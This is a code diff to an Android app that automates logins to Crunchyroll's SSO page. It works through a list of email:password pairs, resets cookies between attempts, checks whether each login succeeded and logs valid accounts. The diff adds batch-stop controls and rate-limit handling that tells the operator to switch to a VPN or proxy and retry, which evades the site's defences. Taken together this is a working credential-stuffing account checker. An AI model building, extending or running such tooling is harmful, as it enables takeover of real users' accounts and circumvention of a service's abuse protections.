@@ -9,6 +9,7 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.http.SslError;
 import android.os.Bundle;
+import android.os.CountDownTimer;
 import android.util.Log;
 import android.webkit.JavascriptInterface;
 import android.webkit.SslErrorHandler;
@@ -38,7 +39,7 @@ public class MainActivity extends Activity {
     private static final String TAG = "WebAutomation";
     private WebView mWebView;
     private final String mainUrl = "https://sso.crunchyroll.com/login";
-    private Button btnRecord, btnStop, btnPlay, btnSettings, btnResults, btnExportScript, btnInfo, btnAdSystem;
+    private Button btnRecord, btnStop, btnPlay, btnStopBatch, btnSettings, btnResults, btnExportScript, btnInfo, btnAdSystem;
 
     private boolean isRecording = false;
     private boolean isReplaying = false;
@@ -60,6 +61,11 @@ public class MainActivity extends Activity {
     private android.os.Handler adCheckHandler = new android.os.Handler();
     private Runnable adCheckRunnable;
 
+    // Batch Logic Handlers
+    private android.os.Handler batchHandler = new android.os.Handler();
+    private Runnable verificationRunnable;
+    private Runnable nextCredentialRunnable;
+
     private static final String PREFS_NAME = "AutomationPrefs";
     private static final String KEY_EVENTS = "saved_events";
 
@@ -73,6 +79,7 @@ public class MainActivity extends Activity {
         btnRecord = findViewById(R.id.btn_record);
         btnStop = findViewById(R.id.btn_stop);
         btnPlay = findViewById(R.id.btn_play);
+        btnStopBatch = findViewById(R.id.btn_stop_batch);
         btnSettings = findViewById(R.id.btn_settings);
         btnResults = findViewById(R.id.btn_results);
         btnExportScript = findViewById(R.id.btn_export_script);
@@ -175,7 +182,16 @@ public class MainActivity extends Activity {
                 if (isRecording) {
                     injectRecorder();
                 } else if (isReplaying) {
-                    injectReplayer();
+                     // Check if we are waiting for a clean start
+                     if (isBatchRunning) {
+                         // Only inject if we are sure we are on the login page and ready
+                         if (url.startsWith(mainUrl)) {
+                             // Inject with a slight delay to ensure DOM is ready
+                             mWebView.postDelayed(() -> injectReplayer(), 1500);
+                         }
+                     } else {
+                         injectReplayer(); // Manual replay
+                     }
                 }
             }
         });
@@ -186,10 +202,12 @@ public class MainActivity extends Activity {
         btnRecord.setVisibility(android.view.View.GONE);
         btnStop.setVisibility(android.view.View.GONE);
         btnExportScript.setVisibility(android.view.View.GONE);
+        btnStopBatch.setVisibility(android.view.View.GONE);
 
         btnRecord.setOnClickListener(v -> startRecording());
         btnStop.setOnClickListener(v -> stopRecording());
         btnPlay.setOnClickListener(v -> startBatchReplay());
+        btnStopBatch.setOnClickListener(v -> stopBatch());
         btnSettings.setOnClickListener(v -> startActivity(new android.content.Intent(this, SettingsActivity.class)));
         btnSettings.setOnLongClickListener(v -> {
             showAdminLoginDialog();
@@ -292,14 +310,32 @@ public class MainActivity extends Activity {
         isBatchRunning = true;
         currentCredentialIndex = 0;
 
+        btnPlay.setVisibility(android.view.View.GONE);
+        btnStopBatch.setVisibility(android.view.View.VISIBLE);
+
         Toast.makeText(this, "Starting Batch Replay: " + credentialList.size() + " accounts", Toast.LENGTH_SHORT).show();
         processNextCredential();
     }
 
+    private void stopBatch() {
+        isBatchRunning = false;
+        isReplaying = false;
+
+        // Remove all pending callbacks
+        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
+        if (nextCredentialRunnable != null) batchHandler.removeCallbacks(nextCredentialRunnable);
+
+        btnPlay.setVisibility(android.view.View.VISIBLE);
+        btnStopBatch.setVisibility(android.view.View.GONE);
+
+        Toast.makeText(this, "Batch Execution Stopped", Toast.LENGTH_SHORT).show();
+    }
+
     private void processNextCredential() {
+        if (!isBatchRunning) return;
+
         if (currentCredentialIndex >= credentialList.size()) {
-            isBatchRunning = false;
-            isReplaying = false;
+            stopBatch(); // Reset UI state
             runOnUiThread(() -> new AlertDialog.Builder(MainActivity.this)
                 .setTitle("Batch Complete")
                 .setMessage("Processed all accounts.")
@@ -311,6 +347,9 @@ public class MainActivity extends Activity {
         String currentPair = credentialList.get(currentCredentialIndex);
         Log.d(TAG, "Processing: " + currentPair);
 
+        // Cancel any lingering callbacks
+        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
+
         // Clear cookies to ensure fresh login
         android.webkit.CookieManager.getInstance().removeAllCookies(null);
         android.webkit.WebStorage.getInstance().deleteAllData();
@@ -319,15 +358,8 @@ public class MainActivity extends Activity {
         lastExecutedIndex = -1;
 
         // Ensure we are on the correct URL before injecting anything
-        if (!mWebView.getUrl().startsWith(mainUrl)) {
-            Log.d(TAG, "Not on login page, reloading...");
-            mWebView.loadUrl(mainUrl);
-            // The onPageFinished listener will trigger injectReplayer when done
-        } else {
-             // Already on page, force reload to be safe or just start?
-             // User requested "reload sounds good", so let's reload.
-             mWebView.loadUrl(mainUrl);
-        }
+        // Force reload to ensure clean state even if URL matches
+        mWebView.loadUrl(mainUrl);
     }
 
     private void injectRecorder() {
@@ -339,6 +371,8 @@ public class MainActivity extends Activity {
     }
 
     private void injectReplayer() {
+        if (!isReplaying) return;
+
         Log.d(TAG, "Injecting Replayer Script");
         String js = readAssetFile("replayer.js");
 
@@ -385,8 +419,10 @@ public class MainActivity extends Activity {
             } catch (JSONException e) {}
         }
 
+        // Define the verification runnable
+        verificationRunnable = this::checkVerificationStatus;
         // Wait at least the replay duration + 5 seconds for network
-        mWebView.postDelayed(this::checkVerificationStatus, replayDuration + 5000);
+        batchHandler.postDelayed(verificationRunnable, replayDuration + 5000);
     }
 
     private void checkVerificationStatus() {
@@ -401,14 +437,12 @@ public class MainActivity extends Activity {
 
         String js = readAssetFile("verifier.js");
         mWebView.evaluateJavascript(js, value -> {
-            // Value is returned as a JSON string wrapped in quotes, e.g. "{\"status\":\"success\"}"
-            // Android adds extra quotes around the return value of evaluateJavascript
+            if (!isBatchRunning) return; // Stop if batch was stopped during eval
+
             if (value != null && value.length() > 2) {
-                 // Clean up the string (remove surrounding quotes if present)
                  String jsonStr = value;
                  if (jsonStr.startsWith("\"") && jsonStr.endsWith("\"")) {
                      jsonStr = jsonStr.substring(1, jsonStr.length() - 1);
-                     // Unescape escaped quotes
                      jsonStr = jsonStr.replace("\\\"", "\"");
                  }
 
@@ -422,25 +456,73 @@ public class MainActivity extends Activity {
                      } else if ("failure".equals(status)) {
                          logResult(false, res.optString("detail"));
                          moveToNext();
+                     } else if ("rate_limit".equals(status)) {
+                         handleRateLimit();
                      } else {
-                         // Still pending, check again in 2 seconds
+                         // Still pending
                          Log.d(TAG, "Verification pending: " + res.optString("detail"));
-                         mWebView.postDelayed(this::checkVerificationStatus, 2000);
+                         verificationRunnable = this::checkVerificationStatus;
+                         batchHandler.postDelayed(verificationRunnable, 2000);
                      }
                  } catch (JSONException e) {
                      Log.e(TAG, "Error parsing verification result: " + value, e);
-                     // If we can't parse, assume pending or error, try again briefly or fail
-                     mWebView.postDelayed(this::checkVerificationStatus, 2000);
+                     verificationRunnable = this::checkVerificationStatus;
+                     batchHandler.postDelayed(verificationRunnable, 2000);
                  }
             } else {
-                mWebView.postDelayed(this::checkVerificationStatus, 2000);
+                verificationRunnable = this::checkVerificationStatus;
+                batchHandler.postDelayed(verificationRunnable, 2000);
             }
+        });
+    }
+
+    private void handleRateLimit() {
+        Log.w(TAG, "Rate Limit Detected! Pausing...");
+
+        // Remove pending verifications
+        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
+
+        // Show Dialog
+        runOnUiThread(() -> {
+            AlertDialog dialog = new AlertDialog.Builder(this)
+                .setTitle("Rate Limit Detected")
+                .setMessage("Waiting 5 minutes...\nPlease connect to a VPN/Proxy.")
+                .setCancelable(false)
+                .setPositiveButton("I Connected VPN - Continue", (d, w) -> {
+                    // User manually continued
+                     d.dismiss();
+                     // Retry the SAME credential
+                     Toast.makeText(this, "Resuming...", Toast.LENGTH_SHORT).show();
+                     processNextCredential();
+                })
+                .create();
+            dialog.show();
+
+            // 5 Minute Countdown
+            new CountDownTimer(300000, 1000) {
+                public void onTick(long millisUntilFinished) {
+                    if (dialog.isShowing()) {
+                        dialog.setMessage("Waiting " + (millisUntilFinished / 1000) + "s...\nPlease connect to a VPN/Proxy.");
+                    } else {
+                        cancel();
+                    }
+                }
+
+                public void onFinish() {
+                    if (dialog.isShowing()) {
+                        dialog.dismiss();
+                        if (isBatchRunning) {
+                            Toast.makeText(MainActivity.this, "Time's up. Retrying...", Toast.LENGTH_SHORT).show();
+                            processNextCredential();
+                        }
+                    }
+                }
+            }.start();
         });
     }
 
     private void logResult(boolean success, String detail) {
         String cred = credentialList.get(currentCredentialIndex);
-        // Format: SUCCESS/error/failure email:pass (powered by DTECH)
         String status = success ? "SUCCESS" : "FAILURE";
         String msg = status + " " + cred + " (powered by DTECH)";
         Log.i(TAG, "Batch Result: " + msg);
@@ -563,7 +645,8 @@ public class MainActivity extends Activity {
 
     private void moveToNext() {
         currentCredentialIndex++;
-        mWebView.postDelayed(this::processNextCredential, 1000);
+        nextCredentialRunnable = this::processNextCredential;
+        batchHandler.postDelayed(nextCredentialRunnable, 1500);
     }
 
     private void saveSessionToPrefs() {
